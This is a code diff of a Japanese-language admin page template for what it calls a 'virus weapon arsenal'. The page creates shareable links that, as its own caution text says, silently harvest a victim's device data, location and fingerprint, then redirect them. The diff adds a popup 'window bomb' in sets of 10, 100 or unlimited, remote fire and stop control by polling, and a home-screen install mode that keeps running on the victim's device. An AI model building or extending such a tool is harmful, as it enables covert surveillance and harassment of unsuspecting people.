@@ -23,12 +23,12 @@ input.url{flex:1;min-width:190px;font-family:ui-monospace,Menlo,monospace;font-s
 .tabs a{padding:8px 16px;border-radius:999px;background:#20242e;border:1px solid #39415a;
   color:#c7cddb;text-decoration:none;font-size:13px}
 .tabs a.on{background:#4c8dff;border-color:#4c8dff;color:#fff;font-weight:600}
-.desc{font-size:12px;color:#8b93a7;margin-top:2px;line-height:1.7}
 .caution{background:#2a2210;border:1px solid #5a4a1f;color:#f0c869;border-radius:8px;
   padding:8px 10px;font-size:12px;line-height:1.7;margin-top:8px}
 .caution.big{margin:10px 0}
-.auto{display:inline-block;font-size:11px;padding:2px 8px;border-radius:999px;
-  background:#16321f;border:1px solid #2e6b45;color:#7ee08a}
+.badge{display:inline-block;font-size:11px;padding:2px 8px;border-radius:999px;
+  background:#20242e;border:1px solid #39415a;color:#c7cddb}
+.badge.on{background:#16321f;border-color:#2e6b45;color:#7ee08a}
 </style></head><body>
 
 <div class="tabs">
@@ -40,14 +40,15 @@ input.url{flex:1;min-width:190px;font-family:ui-monospace,Menlo,monospace;font-s
 
 <h1>兵器庫（ウイルス兵器保管庫）</h1>
 <p class="dim">相手に踏ませるURLは <span class="mono">{{ base }}/v/コード</span> です。ログイン不要。
-  自分は <span class="mono">{{ base }}/vp/コード</span> で結果を見ます。
-  インストール型は <b>追加した瞬間から自動で兵器が動きます</b>。</p>
+  自分は <span class="mono">{{ base }}/vp/コード</span> で結果と操作をします。</p>
 
 <div class="caution big">
-  ⚠ <b>注意書き</b><br>
-  ・リンク型：開いた瞬間から自動で始まります。開いただけで端末情報・位置・指紋を抜き取り、そのまま本物のサイトへ飛びます（＝自爆）。<br>
-  ・インストール型：ホーム画面に追加すると自爆します。以後その端末では自動で兵器が起動し続け、本人がアプリを消すまで止まりません。<br>
-  ・<b>インストールしなくても渡せます</b>。下のURLをコピー／共有するだけで相手に送れます。
+  ⚠ <b>掟</b><br>
+  ・開いた瞬間から全部自動・無限。<b>ボタン操作は不要</b>。画面はスピナーだけ。<br>
+  ・窓爆弾は1セット＝10 / 100 / ∞ を選べる（既定100）。<b>10秒以内に出し切る</b>。<br>
+  ・発射／停止／枚数は <b>こちらの監視室から遠隔操作</b>（兵器ページがポーリング）。<br>
+  ・リンク型は抜き取ったあと本物へ飛ぶ（自爆）。常駐型はホーム画面に追加＝自爆。<br>
+  ・<b>インストール不要</b>。URLをコピー／共有でそのまま渡せる。
 </div>
 
 <h3>新規作成</h3>
@@ -59,7 +60,13 @@ input.url{flex:1;min-width:190px;font-family:ui-monospace,Menlo,monospace;font-s
       <option value="{{ m }}" {% if m == 'mix' %}selected{% endif %}>{{ label }}</option>
       {% endfor %}
     </select></label>
-  <label>飛び先（trojan_link / mix のとき） <input type="text" name="dest" placeholder="https://..."></label>
+  <label>1セットの枚数（窓爆弾・ミックス）
+    <select name="winset">
+      <option value="10">10枚</option>
+      <option value="100" selected>100枚</option>
+      <option value="0">∞（止まるまで）</option>
+    </select></label>
+  <label>飛び先（リンク型 / 全部ミックスのとき） <input type="text" name="dest" placeholder="https://..."></label>
   <label>メモ <input type="text" name="note"></label>
   <button type="submit">作成してリンクを取得</button>
 </form>
@@ -70,9 +77,11 @@ input.url{flex:1;min-width:190px;font-family:ui-monospace,Menlo,monospace;font-s
     <div class="row">
       <b>{{ r.name }}</b> <span class="mono">{{ r.code }}</span>
       <span class="dim">{{ r.mode_label }}</span>
-      {% if r.auto %}<span class="auto">インストールで自動発射</span>{% endif %}
+      <span class="badge">{{ r.set_label }}</span>
+      {% if r.auto %}<span class="badge on">常駐＝自動発射</span>{% endif %}
+      <span class="badge {% if r.firing %}on{% endif %}">{{ '稼働中' if r.firing else '停止中' }}</span>
       <span class="dim">{{ r.hits or 0 }}回</span>
-      {% if not r.active %}<span class="dim">停止中</span>{% endif %}
+      {% if not r.active %}<span class="dim">無効</span>{% endif %}
     </div>
     <div class="row">
       <input class="url" readonly value="{{ r.share }}" onclick="this.select()">
@@ -82,7 +91,7 @@ input.url{flex:1;min-width:190px;font-family:ui-monospace,Menlo,monospace;font-s
     </div>
     {% if r.caution %}<div class="caution">{{ r.caution }}</div>{% endif %}
     <div class="row">
-      <a class="btn" href="{{ r.watch }}">結果</a>
+      <a class="btn" href="{{ r.watch }}">結果・操作</a>
       <a class="btn" href="{{ r.share }}" target="_blank">開く</a>
       <form method="post" action="/vp/{{ r.code }}/delete" style="margin:0"
             onsubmit="return confirm('削除しますか？')"><button class="mini" type="submit">削除</button></form>
